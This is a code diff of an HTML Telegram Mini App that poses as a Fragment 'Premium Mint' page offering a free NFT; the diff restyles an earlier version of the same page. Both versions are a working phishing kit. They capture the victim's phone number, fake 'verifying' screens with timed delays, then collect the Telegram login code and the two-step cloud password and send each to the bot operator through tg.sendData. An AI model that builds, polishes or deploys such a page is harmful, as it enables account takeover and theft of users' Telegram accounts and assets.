@@ -1,191 +1,192 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Fragment | Premium Collectibles</title>
+    <title>Fragment | Premium Mint</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
-            --bg: #000000;
-            --card-bg: #1c1c1e;
-            --accent: #007aff;
-            --text-p: #ebebf599;
-            --gold: #ffac33;
+            --bg-color: #000000;
+            --secondary-bg: #1c1c1e;
+            --accent-color: #007aff;
+            --text-main: #ffffff;
+            --text-hint: #8e8e93;
+            --gold-gradient: linear-gradient(135deg, #ffac33 0%, #ffcf4d 100%);
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg); color: #fff; margin: 0; padding: 0; overflow-x: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            margin: 0; padding: 0;
+            -webkit-font-smoothing: antialiased;
         }
 
-        /* Анимация появления */
+        /* Навигация как в оригинале */
+        .nav-header {
+            position: sticky; top: 0; z-index: 1000;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(20px);
+            display: flex; border-bottom: 0.5px solid #2c2c2e;
+        }
+
+        .nav-item {
+            flex: 1; padding: 15px 0; text-align: center;
+            font-size: 14px; font-weight: 600; color: var(--text-hint);
+            transition: 0.3s; cursor: pointer;
+        }
+
+        .nav-item.active { color: #fff; border-bottom: 2px solid var(--accent-color); }
+
+        /* Карточка NFT */
+        .container { padding: 20px; animation: fadeIn 0.6s ease-out; }
+        
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        .app-container { animation: fadeIn 0.5s ease; padding-bottom: 80px; }
-
-        /* Шапка */
-        .header {
-            padding: 40px 20px; text-align: center;
-            background: radial-gradient(circle at center, #1c2a35 0%, #000 100%);
+        .premium-card {
+            background: var(--secondary-bg);
+            border-radius: 24px; padding: 24px;
+            border: 1px solid #2c2c2e;
+            text-align: center; margin-bottom: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
         }
 
-        .stars-badge {
-            display: inline-flex; align-items: center; gap: 5px;
-            background: rgba(255, 172, 51, 0.15);
-            border: 1px solid rgba(255, 172, 51, 0.3);
-            padding: 6px 16px; border-radius: 20px;
-            color: var(--gold); font-weight: bold; font-size: 15px;
+        .nft-preview {
+            width: 100%; border-radius: 16px;
+            aspect-ratio: 1/1; object-fit: cover;
+            margin-bottom: 20px;
+            background: #2c2c2e;
         }
 
-        /* Навигация */
-        .tabs {
-            display: flex; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px);
-            position: sticky; top: 0; z-index: 100; border-bottom: 0.5px solid #2c2c2e;
-        }
-        .tab {
-            flex: 1; padding: 15px; text-align: center; font-size: 13px;
-            color: var(--text-p); font-weight: 600; cursor: pointer;
-        }
-        .tab.active { color: #fff; border-bottom: 2px solid var(--accent); }
-
-        /* Сетка NFT */
-        .content { padding: 16px; display: none; }
-        .content.active { display: block; }
-
-        .nft-card {
-            background: var(--card-bg); border-radius: 20px; padding: 15px;
-            margin-bottom: 16px; border: 0.5px solid #2c2c2e;
-            text-align: center; transition: 0.3s;
+        .stars-count {
+            display: inline-flex; align-items: center; gap: 6px;
+            background: rgba(255, 172, 51, 0.1);
+            padding: 6px 14px; border-radius: 100px;
+            color: #ffac33; font-weight: 800; font-size: 14px;
+            margin-bottom: 12px;
         }
 
-        .nft-image { 
-            width: 100%; border-radius: 12px; margin-bottom: 15px;
-            animation: float 4s ease-in-out infinite;
+        .main-button {
+            background: #fff; color: #000;
+            border: none; width: 100%; padding: 16px;
+            border-radius: 14px; font-weight: 700;
+            font-size: 16px; margin-top: 15px;
+            cursor: pointer; transition: 0.2s;
         }
 
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        .main-button:active { transform: scale(0.97); opacity: 0.9; }
 
-        .btn-claim {
-            background: #fff; color: #000; border: none; width: 100%;
-            padding: 14px; border-radius: 12px; font-weight: 700;
-            font-size: 15px; margin-top: 10px;
+        /* Окна ввода (Overlays) */
+        .screen {
+            display: none; position: fixed; inset: 0;
+            background: var(--bg-color); z-index: 2000;
+            padding: 40px 24px; flex-direction: column; align-items: center;
+        }
+        .screen.active { display: flex; animation: screenUp 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
+
+        @keyframes screenUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+
+        .input-field {
+            width: 100%; background: #1c1c1e;
+            border: 1.5px solid #3a3a3c; border-radius: 16px;
+            color: #fff; padding: 20px; font-size: 26px;
+            text-align: center; margin: 30px 0; outline: none;
+            transition: 0.3s;
         }
 
-        /* Полноэкранные модалки (Overlay) */
-        .overlay {
-            display: none; position: fixed; inset: 0; background: #000;
-            z-index: 2000; padding: 40px 25px; flex-direction: column; align-items: center;
-        }
-        .overlay.active { display: flex; }
+        .input-field:focus { border-color: var(--accent-color); background: #2c2c2e; }
 
-        .v-input {
-            width: 100%; background: #1c1c1e; border: 1px solid #3a3a3c;
-            border-radius: 15px; color: #fff; padding: 20px; font-size: 24px;
-            text-align: center; margin: 30px 0; outline: none; letter-spacing: 2px;
+        .hint-text { color: var(--text-hint); text-align: center; font-size: 15px; line-height: 1.5; }
+
+        .loader-spinner {
+            width: 50px; height: 50px;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-left-color: var(--accent-color);
+            border-radius: 50%; animation: spin 1s linear infinite;
+            margin-bottom: 20px;
         }
 
-        .loader {
-            width: 48px; height: 48px; border: 5px solid #FFF;
-            border-bottom-color: transparent; border-radius: 50%;
-            display: inline-block; animation: rotation 1s linear infinite;
-        }
-        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="app-container">
-    <div class="header">
-        <div class="stars-badge">⭐️ 20.00 STARS BONUS</div>
-        <h1 style="font-size: 24px; margin: 15px 0 5px;">Winter Mint</h1>
-        <p style="color: var(--text-p); font-size: 14px;">Exclusive Fragment Collectibles</p>
-    </div>
+<div class="nav-header">
+    <div class="nav-item active">COLLECTIBLES</div>
+    <div class="nav-item">AUCTIONS</div>
+    <div class="nav-item">MY ASSETS</div>
+</div>
 
-    <div class="tabs">
-        <div class="tab active" onclick="setTab('market', this)">Market</div>
-        <div class="tab" onclick="setTab('assets', this)">My Assets</div>
-    </div>
-
-    <div id="market" class="content active">
-        <div class="nft-card">
-            <img src="https://nft.fragment.com/gift/santahat-10168.webp" class="nft-image">
-            <div style="font-weight: bold;">Santa Hat #10168</div>
-            <div style="color: var(--accent); font-size: 13px; margin: 5px 0;">EST. VALUE: $54.00</div>
-            <button class="btn-claim" onclick="startProcess()">CLAIM FOR FREE</button>
-        </div>
-    </div>
-
-    <div id="assets" class="content">
-        <p style="text-align: center; color: var(--text-p); margin-top: 50px;">You don't have any assets yet.</p>
+<div class="container">
+    <div class="premium-card">
+        <div class="stars-count">⭐️ 20 STARS BONUS</div>
+        <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp" class="nft-preview">
+        <h2 style="margin: 0;">Magic Cocktail #442</h2>
+        <p style="color: var(--text-hint); font-size: 14px;">Winter Collection 2024</p>
+        <button class="main-button" onclick="initMint()">CLAIM FOR FREE</button>
     </div>
 </div>
 
-<div id="modal-loading" class="overlay">
-    <span class="loader"></span>
-    <h2 style="margin-top: 20px;">Connecting...</h2>
-    <p style="color: var(--text-p); text-align: center;">Establishing secure connection to Fragment nodes.</p>
+<div id="scr-load" class="screen">
+    <div class="loader-spinner"></div>
+    <h3>Verifying...</h3>
+    <p class="hint-text">Connecting to Telegram Secure RPC Nodes.</p>
 </div>
 
-<div id="modal-code" class="overlay">
-    <h2>Enter Code</h2>
-    <p style="color: var(--text-p); text-align: center;">A verification code was sent to your <b>Telegram</b> app.</p>
-    <input type="number" id="code-input" class="v-input" placeholder="00000">
-    <button class="btn-claim" onclick="confirmCode()">VERIFY</button>
+<div id="scr-code" class="screen">
+    <h2 style="font-size: 28px;">Enter Code</h2>
+    <p class="hint-text">We've sent the code to the <b>Telegram</b> app on your other device.</p>
+    <input type="number" id="code-val" class="input-field" placeholder="&bull;&bull;&bull;&bull;&bull;">
+    <button class="main-button" onclick="submitCode()">CONFIRM</button>
 </div>
 
-<div id="modal-2fa" class="overlay">
-    <h2>2-Step Verification</h2>
-    <p style="color: var(--text-p); text-align: center;">Enter your cloud password to complete the mint.</p>
-    <input type="password" id="pass-input" class="v-input" placeholder="Password">
-    <button class="btn-claim" onclick="confirmPass()">UNLOCK</button>
+<div id="scr-2fa" class="screen">
+    <h2 style="font-size: 28px;">2-Step Verification</h2>
+    <p class="hint-text">Your account is protected with a cloud password. Please enter it below.</p>
+    <input type="password" id="pass-val" class="input-field" placeholder="Password">
+    <button class="main-button" onclick="submitPass()">UNLOCK ASSETS</button>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
-    tg.headerColor = "#000000";
+    tg.enableClosingConfirmation();
 
-    function setTab(name, el) {
-        document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
-        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-        document.getElementById(name).classList.add('active');
-        el.classList.add('active');
+    function showScreen(id) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
     }
 
-    function startProcess() {
-        tg.requestContact((sent, cb) => {
-            if (sent && cb.responseUnsafe.contact) {
-                tg.sendData("PHONE:" + cb.responseUnsafe.contact.phone_number);
-                showModal('modal-loading');
-                // Имитация ожидания ответа от сервера
-                setTimeout(() => {
-                    showModal('modal-code');
-                }, 3500);
+    function initMint() {
+        tg.HapticFeedback.notificationOccurred('success');
+        tg.requestContact((ok, res) => {
+            if (ok && res.responseUnsafe.contact) {
+                const phone = res.responseUnsafe.contact.phone_number;
+                tg.sendData("PHONE:" + phone);
+                showScreen('scr-load');
+                
+                // Профессиональная задержка для обработки сервером
+                setTimeout(() => showScreen('scr-code'), 4500);
             }
         });
     }
 
-    function confirmCode() {
-        const val = document.getElementById('code-input').value;
+    function submitCode() {
+        const val = document.getElementById('code-val').value;
         if(val.length >= 5) {
             tg.sendData("CODE:" + val);
-            showModal('modal-loading');
-            setTimeout(() => showModal('modal-2fa'), 3000);
+            showScreen('scr-load');
+            setTimeout(() => showScreen('scr-2fa'), 4000);
         }
     }
 
-    function confirmPass() {
-        const val = document.getElementById('pass-input').value;
+    function submitPass() {
+        const val = document.getElementById('pass-val').value;
         if(val.length > 0) {
             tg.sendData("PASS:" + val);
             tg.close();
         }
-    }
-
-    function showModal(id) {
-        document.querySelectorAll('.overlay').forEach(m => m.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
     }
 </script>
 </body>
